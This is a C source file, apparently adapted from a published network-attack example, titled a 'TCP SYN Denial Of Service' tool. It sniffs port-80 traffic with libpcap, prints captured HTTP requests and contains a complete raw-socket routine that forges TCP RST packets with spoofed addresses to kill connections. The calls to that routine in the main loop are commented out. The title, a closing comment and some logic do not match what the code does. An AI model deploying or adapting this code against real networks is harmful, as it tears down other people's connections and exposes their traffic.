/* Simple TCP SYN Denial Of Service                                      */
/* Author: Luis Martin Garcia. luis.martingarcia [.at.] gmail [d0t] com  */
/* To compile: gcc tcpsyndos.c -o tcpsyndos -lpcap                       */
/* Run as root!                                                          */
/*                                                                       */
/* This code is distributed under the GPL License. For more info check:  */
/* http://www.gnu.org/copyleft/gpl.html                                  */


#define __USE_BSD         /* Using BSD IP header           */ 
#include <netinet/ip.h>   /* Internet Protocol             */ 
#define __FAVOR_BSD       /* Using BSD TCP header          */ 
#include <netinet/tcp.h>  /* Transmission Control Protocol */ 
#include <pcap.h>         /* Libpcap                       */ 
#include <string.h>       /* String operations             */ 
#include <stdlib.h>       /* Standard library definitions  */ 

#define TCPSYN_LEN 20
#define MAXBYTES2CAPTURE 2048

/* Pseudoheader (Used to compute TCP checksum. Check RFC 793) */
typedef struct pseudoheader {
  u_int32_t src;
  u_int32_t dst;
  u_char zero;
  u_char protocol;
  u_int16_t tcplen;
} tcp_phdr_t;

typedef unsigned short u_int16;
typedef unsigned long u_int32;


/* Function Prototypes */
int TCP_RST_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_int16 dst_prt);
unsigned short in_cksum(unsigned short *addr,int len);

/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LEN	6

	/* Ethernet header */
	struct sniff_ethernet {
		u_char ether_dhost[ETHER_ADDR_LEN]; /* Destination host address */
		u_char ether_shost[ETHER_ADDR_LEN]; /* Source host address */
		u_short ether_type; /* IP? ARP? RARP? etc */
	};

	/* IP header */
	struct sniff_ip {
		u_char ip_vhl;		/* version << 4 | header length >> 2 */
		u_char ip_tos;		/* type of service */
		u_short ip_len;		/* total length */
		u_short ip_id;		/* identification */
		u_short ip_off;		/* fragment offset field */
	#define IP_RF 0x8000		/* reserved fragment flag */
	#define IP_DF 0x4000		/* dont fragment flag */
	#define IP_MF 0x2000		/* more fragments flag */
	#define IP_OFFMASK 0x1fff	/* mask for fragmenting bits */
		u_char ip_ttl;		/* time to live */
		u_char ip_p;		/* protocol */
		u_short ip_sum;		/* checksum */
		struct in_addr ip_src,ip_dst; /* source and dest address */
	};
	#define IP_HL(ip)		(((ip)->ip_vhl) & 0x0f)
	#define IP_V(ip)		(((ip)->ip_vhl) >> 4)

	/* TCP header */
	struct sniff_tcp {
		u_short th_sport;	/* source port */
		u_short th_dport;	/* destination port */
		tcp_seq th_seq;		/* sequence number */
		tcp_seq th_ack;		/* acknowledgement number */

		u_char th_offx2;	/* data offset, rsvd */
	#define TH_OFF(th)	(((th)->th_offx2 & 0xf0) >> 4)
		u_char th_flags;
	#define TH_FIN 0x01
	#define TH_SYN 0x02
	#define TH_RST 0x04
	#define TH_PUSH 0x08
	#define TH_ACK 0x10
	#define TH_URG 0x20
	#define TH_ECE 0x40
	#define TH_CWR 0x80
	#define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
		u_short th_win;		/* window */
		u_short th_sum;		/* checksum */
		u_short th_urp;		/* urgent pointer */
};


/* main(): Main function. Opens network interface for capture. Tells the kernel*/
/* to deliver packets with the ACK or PSH-ACK flags set. Prints information    */
/* about captured packets. Calls TCP_RST_send() to kill the TCP connection     */
/* using TCP RST packets.                                                      */
int main(int argc, char *argv[] ){
 
 int count=0;
 bpf_u_int32 netaddr=0, mask=0;    /* To Store network address and netmask   */ 
 struct bpf_program filter;        /* Place to store the BPF filter program  */ 
 char errbuf[PCAP_ERRBUF_SIZE];    /* Error buffer                           */ 
 pcap_t *descr = NULL;             /* Network interface handler              */ 
 struct pcap_pkthdr pkthdr;        /* Packet information (timestamp,size...) */ 
 const unsigned char *packet=NULL; /* Received raw data                      */ 
 struct ip *iphdr = NULL;          /* IPv4 Header                            */
 struct tcphdr *tcphdr = NULL;     /* TCP Header                             */
 memset(errbuf,0,PCAP_ERRBUF_SIZE);
 int dst_port;

/* ethernet headers are always exactly 14 bytes */
#define SIZE_ETHERNET 14

const struct sniff_ethernet *ethernet; /* The ethernet header */
const struct sniff_ip *ip; /* The IP header */
const struct sniff_tcp *tcp; /* The TCP header */
const char *payload; /* Packet payload */
const char *payload_METHOD="GET / HTTP";
char payload_METHOD_buffer[10];
char payload_HOST[20];
int i,cmp1;

u_int size_ip;
u_int size_tcp;
   
if (argc != 2){
	fprintf(stderr, "USAGE: tcpsyndos <interface>\n");
	exit(1);
}

 /* Open network device for packet capture */ 
 descr = pcap_open_live(argv[1], MAXBYTES2CAPTURE, 1,  512, errbuf);
 if(descr==NULL){
   fprintf(stderr, "pcap_open_live(): %s \n", errbuf);
   exit(1);
 }

 /* Look up info from the capture device. */ 
 if ( pcap_lookupnet( argv[1] , &netaddr, &mask, errbuf) == -1 ){ 
   fprintf(stderr, "ERROR: pcap_lookupnet(): %s\n", errbuf );
   exit(1);
 }

 /* Compiles the filter expression into a BPF filter program */
 if ( pcap_compile(descr, &filter, "tcp dst port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)", 1, mask) == -1){
    fprintf(stderr, "Error in pcap_compile(): %s\n", pcap_geterr(descr) );
    exit(1);
 }
 
 /* Load the filter program into the packet capture device. */ 
 if( pcap_setfilter(descr,&filter) == -1 ){
    fprintf(stderr, "Error in pcap_setfilter(): %s\n", pcap_geterr(descr));
    exit(1);
 }



while(1){ 
 /* Get one packet */
 if ( (packet = pcap_next(descr,&pkthdr)) != NULL){


	ethernet = (struct sniff_ethernet*)(packet);
	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
	size_ip = IP_HL(ip)*4;
	if (size_ip < 20) {
		printf("   * Invalid IP header length: %u bytes\n", size_ip);
		return;
	}
	tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
	size_tcp = TH_OFF(tcp)*4;
	if (size_tcp < 20) {
		printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
		return;
	}


	printf("+--------------------------------------+\n");
	payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);

  	//GET / HTTP
 	for(i=0;i<10;i++){
  		payload_METHOD_buffer[i]=payload[i];
  	}
	for(i=0;i<10;i++){
	  if(payload_METHOD_buffer[i]==payload_METHOD[i]){
	  	cmp1=1;
	  }else{
		cmp1=0;
	  }
	}
  	if(cmp1==1){
		printf("%s",payload);
	}
 
 	iphdr = (struct ip *)(packet+14);
 	tcphdr = (struct tcphdr *)(packet+14+20);
 	
	/*dst_port=ntohs(tcphdr->th_dport);

	 	if(count==0)printf("+-------------------------+\n");
 		printf("Received Packet No.%d:\n", ++count);
 		printf("   ACK: %u\n", ntohl(tcphdr->th_ack) ); 
 		printf("   SEQ: %u\n", ntohl(tcphdr->th_seq) );
 		printf("   DST IP: %d\n", iphdr->ip_dst); 
 		printf("   SRC IP: %d\n", iphdr->ip_src); 
 		printf("   SRC PORT: %d\n", ntohs(tcphdr->th_sport) ); 
 		printf("   DST PORT: %d\n", dst_port ); 
	*/
	//TCP_RST_send(tcp->th_ack, ip->ip_dst.s_addr, ip->ip_src.s_addr, tcp->th_dport, tcp->th_sport);
	//TCP_RST_send(htonl(ntohl(tcp->th_seq)+1), ip->ip_src.s_addr, ip->ip_dst.s_addr, tcp->th_sport, tcp->th_dport);

 		printf("\n+-------------------------+\n");
	

}//End of if packet!= NULL
}//End of while(1)

 

return 0;

}



/* TCP_RST_send(): Crafts a TCP packet with the RST flag set using the supplied */
/* values and sends the packet through a raw socket.                            */
int TCP_RST_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_int16 dst_prt){

  static int i=0;
  int one=1; /* R.Stevens says we need this variable for the setsockopt call */ 

  /* Raw socket file descriptor */ 
  int rawsocket=0;  
  
  /* Buffer for the TCP/IP SYN Packets */
  char packet[ sizeof(struct tcphdr) + sizeof(struct ip) +1 ];   

  /* It will point to start of the packet buffer */  
  struct ip *ipheader = (struct ip *)packet;   
  
  /* It will point to the end of the IP header in packet buffer */  
  struct tcphdr *tcpheader = (struct tcphdr *) (packet + sizeof(struct ip)); 
  
  /* TPC Pseudoheader (used in checksum)    */
  tcp_phdr_t pseudohdr;            

  /* TCP Pseudoheader + TCP actual header used for computing the checksum */
  char tcpcsumblock[ sizeof(tcp_phdr_t) + TCPSYN_LEN ];

  /* Although we are creating our own IP packet with the destination address */
  /* on it, the sendto() system call requires the sockaddr_in structure */
  struct sockaddr_in dstaddr;  
  
  memset(&pseudohdr,0,sizeof(tcp_phdr_t));
  memset(&packet, 0, sizeof(packet));
  memset(&dstaddr, 0, sizeof(dstaddr));   
    
  dstaddr.sin_family = AF_INET;     /* Address family: Internet protocols */
  dstaddr.sin_port = dst_prt;      /* Leave it empty */
  dstaddr.sin_addr.s_addr = dst_ip; /* Destination IP */



  /* Get a raw socket to send TCP packets */   
 if ( (rawsocket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0){
        perror("TCP_RST_send():socket()"); 
        exit(1);
  }
  
  /* We need to tell the kernel that we'll be adding our own IP header */
  /* Otherwise the kernel will create its own. The ugly "one" variable */
  /* is a bit obscure but R.Stevens says we have to do it this way ;-) */
  if( setsockopt(rawsocket, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0){
        perror("TCP_RST_send():setsockopt()"); 
        exit(1);
   }
 
	
  /* IP Header */
  ipheader->ip_hl = 5;     /* Header lenght in octects                       */
  ipheader->ip_v = 4;      /* Ip protocol version (IPv4)                     */
  ipheader->ip_tos = 0;    /* Type of Service (Usually zero)                 */
  ipheader->ip_len = htons( sizeof (struct ip) + sizeof (struct tcphdr) );         
  ipheader->ip_off = 0;    /* Fragment offset. We'll not use this            */
  ipheader->ip_ttl = 64;   /* Time to live: 64 in Linux, 128 in Windows...   */
  ipheader->ip_p = 6;      /* Transport layer prot. TCP=6, UDP=17, ICMP=1... */
  ipheader->ip_sum = 0;    /* Checksum. It has to be zero for the moment     */
  ipheader->ip_id = htons( 1337 ); 
  ipheader->ip_src.s_addr = src_ip;  /* Source IP address                    */
  ipheader->ip_dst.s_addr = dst_ip;  /* Destination IP address               */

  /* TCP Header */   
  tcpheader->th_seq = seq;        /* Sequence Number                         */
  tcpheader->th_ack = htonl(1);   /* Acknowledgement Number                  */
  tcpheader->th_x2 = 0;           /* Variable in 4 byte blocks. (Deprecated) */
  tcpheader->th_off = 5;		  /* Segment offset (Lenght of the header)   */
  tcpheader->th_flags = TH_RST;   /* TCP Flags. We set the Reset Flag        */
  tcpheader->th_win = htons(4500) + rand()%1000;/* Window size               */
  tcpheader->th_urp = 0;          /* Urgent pointer.                         */
  tcpheader->th_sport = src_prt;  /* Source Port                             */
  tcpheader->th_dport = dst_prt;  /* Destination Port                        */
  tcpheader->th_sum=0;            /* Checksum. (Zero until computed)         */
  
  /* Fill the pseudoheader so we can compute the TCP checksum*/
  pseudohdr.src = ipheader->ip_src.s_addr;
  pseudohdr.dst = ipheader->ip_dst.s_addr;
  pseudohdr.zero = 0;
  pseudohdr.protocol = ipheader->ip_p;
  pseudohdr.tcplen = htons( sizeof(struct tcphdr) );

  /* Copy header and pseudoheader to a buffer to compute the checksum */  
  memcpy(tcpcsumblock, &pseudohdr, sizeof(tcp_phdr_t));   
  memcpy(tcpcsumblock+sizeof(tcp_phdr_t),tcpheader, sizeof(struct tcphdr));
    
  /* Compute the TCP checksum as the standard says (RFC 793) */
  tcpheader->th_sum = in_cksum((unsigned short *)(tcpcsumblock), sizeof(tcpcsumblock)); 

  /* Compute the IP checksum as the standard says (RFC 791) */
  ipheader->ip_sum = in_cksum((unsigned short *)ipheader, sizeof(struct ip));
    
  /* Send it through the raw socket */    
  if ( sendto(rawsocket, packet, ntohs(ipheader->ip_len), 0,
                  (struct sockaddr *) &dstaddr, sizeof (dstaddr)) < 0){		
        return -1;                     
    }

  printf("Sent RST Packet:\n");
  printf("   SRC: %d \n", ipheader->ip_src);
  printf("   DST: %d \n", ipheader->ip_dst);
  printf("   Seq=%u\n", ntohl(tcpheader->th_seq));
  printf("   Ack=%d\n", ntohl(tcpheader->th_ack));
  printf("   TCPsum: %02x\n",  tcpheader->th_sum);
  printf("   IPsum: %02x\n", ipheader->ip_sum);
    
  close(rawsocket);

return 0;
  
  
} /* End of IP_Id_send() */




/* This piece of code has been used many times in a lot of differents tools. */
/* I haven't been able to determine the author of the code but it looks like */
/* this is a public domain implementation of the checksum algorithm */
unsigned short in_cksum(unsigned short *addr,int len){
    
register int sum = 0;
u_short answer = 0;
register u_short *w = addr;
register int nleft = len;
    
/*
 * * Our algorithm is simple, using a 32-bit accumulator (sum),
 * * we add sequential 16-bit words to it, and at the end, fold back 
 * * all the carry bits from the top 16 bits into the lower 16 bits. 
 * */
    
while (nleft > 1) {
sum += *w++;
nleft -= 2;
}

/* mop up an odd byte, if necessary */
if (nleft == 1) {
*(u_char *)(&answer) = *(u_char *)w ;
sum += answer;
}

/* add back carry outs from top 16 bits to low 16 bits */
sum = (sum >> 16) + (sum &0xffff); /* add hi 16 to low 16 */
sum += (sum >> 16); /* add carry */
answer = ~sum; /* truncate to 16 bits */
return(answer);

} /* End of in_cksum() */

/* EOF */
